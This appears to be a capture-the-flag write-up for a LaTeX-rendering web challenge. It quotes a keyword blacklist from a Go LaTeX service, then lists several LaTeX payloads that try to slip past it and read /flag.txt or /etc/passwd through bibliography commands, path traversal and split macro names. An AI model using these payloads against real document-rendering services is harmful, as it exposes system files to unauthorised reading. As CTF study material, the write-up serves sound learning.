# latex

My first LaTeX website for my math teacher. I hope this will become the best gift for him! :)

## Solution

http://0.0.0.0:52132

https://github.com/rwestlund/gotex/blob/master/main.go

```go
blacklist = []string{"\\input", "include", "newread", "openin", "file", "read", "closein",
		"usepackage", "fileline", "verbatiminput", "url", "href", "text", "write",
		"newwrite", "outfile", "closeout", "immediate", "|", "write18", "includegraphics",
		"openout", "newcommand", "expandafter", "csname", "endcsname", "^^"}
```

```latex

\documentclass[12pt]{article}
\begin{document}
\begin{verbatim}
This is a LaTeX document.
\end{verbatim}
\end{document}

\documentclass[12pt]{article}
\begin{document}
This is a LaTeX document.
\addbibresource{/flag.txt}
\end{document}

\documentclass[12pt]{article}
\def\custominput{input{/etc/passwd}}
\begin{document}
\custominput
\end{document}

\documentclass[12pt]{article}
% \makeglossary
% \glossary{test}
\bibliography{../../../../../../flag.txt}
\addbibresource{../../../../../flag.txt}

\begin{document}
This is a LaTeX document.
\nocite{*}
\end{document}
                        
% make glossary entries with \input{}

\bibliography{../../../../../../env/passwd} 



\documentclass[12pt]{article}      
\def\a{inp}
\def\b{ut}

\begin{document}
This is a LaTeX document.
\verb|\a\b|{/etc/passwd}
\end{document}

```

